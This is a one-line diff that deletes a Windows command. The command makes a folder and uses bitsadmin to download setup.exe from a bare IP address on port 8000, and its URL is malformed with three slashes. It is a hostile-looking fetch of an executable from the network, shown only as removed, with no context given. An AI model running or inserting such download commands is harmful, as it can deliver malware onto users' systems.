@@ -1,1 +1,0 @@
-mkdir C:\setup && bitsadmin /transfer myJob /download /priority high http:///173.255.235.227:8000/setup.exe C:\setup\setup.exe
